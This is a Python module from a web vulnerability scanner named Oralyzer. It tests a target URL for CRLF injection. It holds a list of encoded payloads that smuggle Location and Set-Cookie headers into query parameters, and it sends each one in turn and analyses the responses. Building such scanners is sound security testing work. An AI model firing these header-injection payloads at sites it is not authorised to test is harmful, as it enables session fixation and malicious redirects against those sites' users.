"""CRLF injection scanning for Oralyzer."""

from __future__ import annotations

import logging
from typing import Callable, List, Optional

import requests

from .detection import Finding, ResponseAnalyzer
from .http import HttpClient
from .payloads import build_test_cases

logger = logging.getLogger(__name__)

CRLF_PAYLOADS = [
    r"%0d%0aLocation:www.google.com%0d%0a",
    r"%0d%0aSet-Cookie:name=ch33ms;",
    r"\r\n\tSet-Cookie:name=ch33ms;",
    r"\r\tSet-Cookie:name=ch33ms;",
    r"%E5%98%8A%E5%98%8DLocation:www.google.com",
    r"\rSet-Cookie:name=ch33ms;",
    r"\r%20Set-Cookie:name=ch33ms;",
    r"\r\nSet-Cookie:name=ch33ms;",
    r"\r\n%20Set-Cookie:name=ch33ms;",
    r"%u000ASet-Cookie:name=ch33ms;",
    r"%23%0D%0ALocation:www.google.com;",
    r"%5cr%5cnLocation:www.google.com",
    r"%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:name=ch33ms;",
]


def scan_crlf(
    url: str,
    http_client: HttpClient,
    progress_callback: Optional[Callable[[int, int], None]] = None,
) -> List[Finding]:
    """Scan a URL for CRLF injection vulnerabilities.

    Args:
        url: Target URL to scan.
        http_client: HTTP client to use for requests.
        progress_callback: Optional callback(current, total) for progress updates.

    Returns:
        List of findings.
    """
    analyzer = ResponseAnalyzer(CRLF_PAYLOADS)
    findings = []

    test_cases = build_test_cases(url, CRLF_PAYLOADS)

    if len(test_cases) == 3:
        queries, payloads, base_url = test_cases
        total = len(queries)

        for i, (params, payload) in enumerate(zip(queries, payloads), 1):
            if progress_callback:
                progress_callback(i, total)

            try:
                response = http_client.get(base_url, params=params)
                finding = analyzer.analyze_crlf(response, payload)
                if finding:
                    findings.append(finding)
            except requests.exceptions.RequestException as e:
                logger.warning("Request failed for %s: %s", base_url, e)
    else:
        urls, payloads = test_cases
        total = len(urls)

        for i, (test_url, payload) in enumerate(zip(urls, payloads), 1):
            if progress_callback:
                progress_callback(i, total)

            try:
                response = http_client.get(test_url)
                finding = analyzer.analyze_crlf(response, payload)
                if finding:
                    findings.append(finding)
            except requests.exceptions.RequestException as e:
                logger.warning("Request failed for %s: %s", test_url, e)

    return findings
